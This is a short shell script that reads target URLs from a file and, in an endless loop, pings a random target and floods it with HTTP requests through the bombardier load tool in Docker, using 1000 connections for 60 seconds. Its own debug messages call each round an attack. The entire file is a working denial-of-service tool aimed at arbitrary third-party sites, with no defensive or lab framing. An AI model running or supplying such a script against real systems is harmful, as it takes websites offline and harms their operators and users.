#!/bin/sh

PING_COUNT=1
PING_TIMEOUT=60
ATTACK_CONNECTIONS=1000
ATTACK_DURATION=60s

TARGETS_FILE="targets.txt"
targets=$(cat $TARGETS_FILE)

echo "Targets:"
echo $targets

function select_target()
{
	CURRENT_TARGET=${targets[ $RANDOM % ${#targets[@]} ]}	
}

function get_target_hostname()
{
	CURRENT_HOST=$CURRENT_TARGET
	CURRENT_HOST=$(echo "$CURRENT_HOST" | sed 's/http:\/\///')
	CURRENT_HOST=$(echo "$CURRENT_HOST" | sed 's/https:\/\///')
}

while true
do
	echo "[DEBUG] Selecting target..."
	select_target;
	get_target_hostname;

	if ping $CURRENT_HOST -c $PING_COUNT -W $PING_TIMEOUT -q
	then
		echo "[DEBUG] (SUCCESS) Attacking $CURRENT_TARGET!"	
		sudo docker run -ti --rm alpine/bombardier -c $ATTACK_CONNECTIONS -d $ATTACK_DURATION -l $CURRENT_TARGET;	
		echo "[DEBUG] (SUCCESS) Attack on $CURRENT_TARGET done!"
	else
		echo "[DEBUG] (FAILED)  $CURRENT_TARGET not reachable..."	
	fi
done

